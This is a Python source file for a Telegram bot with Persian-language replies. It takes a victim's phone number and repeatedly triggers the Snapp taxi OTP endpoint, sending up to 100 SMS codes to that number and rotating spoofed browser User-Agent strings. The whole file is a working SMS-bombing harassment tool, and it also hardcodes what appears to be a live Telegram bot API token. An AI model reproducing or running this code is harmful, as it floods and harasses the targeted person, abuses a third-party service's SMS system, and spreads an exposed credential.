import time
import random
import requests
from telegram.ext import *


API_KEY = "5781373761:AAHJAeZ1466b91VxVYrRrW0kmQWzZ_DHtFg"
print("Bot started!")


def start_commond(update, context):
    return update.message.reply_text("سلام شماره ای که هدفته رو بفرست")


def help_commond(update, context):
    return update.message.reply_text("شماره را به صورت انگلیسی تایپ کنید")


def message(update, context):
    number = int(update.message.text)
    for i in range(1, 101):
        update.message.reply_text("در حال رسال پیامک شماره  %s" % i)
        heads = [
            {
                'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:76.0) Gecko/20100101 Firefox/76.0',
                'Accept': '*/*'
            },
            {
                "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
                'Accept': '*/*'
            },
            {
                "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
                'Accept': '*/*'
            },
            {
                'User-Agent': 'Mozilla/5.0 (Windows NT 3.1; rv:76.0) Gecko/20100101 Firefox/69.0',
                'Accept': '*/*'
            },
            {
                "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/76.0",
                'Accept': '*/*'
            },
        ]
        rhead = random.choice(heads)
        phonenumber = {"cellphone": number}
        url = 'https://app.snapp.taxi/api/api-passenger-oauth/v2/otp'

        try:
            req = requests.post(url, data=phonenumber, json=rhead)
            print(req)
            update.message.reply_text("تعداد پیامک ارسال شده:%s" % i)
        except:
            update.message.reply_text("متاسفانه پیامک ارسال نشد")
        time.sleep(3)
        

updater = Updater(API_KEY, use_context=True)
dp = updater.dispatcher
# dp mokhaffafe dispatcher hast
dp.add_handler(CommandHandler("start", start_commond))
dp.add_handler(CommandHandler("help", help_commond))
dp.add_handler(MessageHandler(Filters.text, message))
updater.start_polling(5)
updater.idle()
